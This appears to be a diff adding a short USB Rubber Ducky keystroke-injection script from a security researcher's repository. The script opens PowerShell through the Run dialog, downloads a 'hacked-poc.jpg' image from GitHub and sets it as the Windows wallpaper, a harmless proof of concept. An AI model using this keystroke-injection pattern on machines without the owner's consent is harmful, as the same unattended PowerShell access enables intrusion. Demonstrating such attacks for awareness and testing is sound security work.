@@ -1,0 +1,59 @@
+REM Author: Florian Hansemann | https://hansesecure.de | @CyberWarship
+REM Date:   09/2020
+REM Source: https://github.com/HanseSecure/Rubber-Ducky/
+
+REM Info:   This is a script to download and change the wallpaper in windows 10
+REM 1.      Download Image and save it to the userprofile location
+REM 2.      Set the Wallpaper Value to that file
+
+DELAY 2000
+
+GUI r 
+
+DELAY 200
+
+STRING powershell
+
+ENTER
+
+DELAY 500
+
+STRING wget https://github.com/HanseSecure/Rubber-Ducky/raw/master/images/hacked-poc.jpg -OutFile '.\new-wallpaper.jpg'; exit
+
+ENTER
+
+DELAY 5000
+
+CONTROL ESCAPE
+
+DELAY 500
+
+STRING wallpaper
+
+DELAY 500
+
+ENTER
+
+DELAY 500
+
+TAB
+
+DELAY 500
+
+TAB
+
+DELAY 500
+
+ENTER
+
+DELAY 500
+
+STRING %userprofile%\new-wallpaper.jpg
+
+DELAY 500
+
+ENTER
+
+DELAY 1000
+
+ALT F4
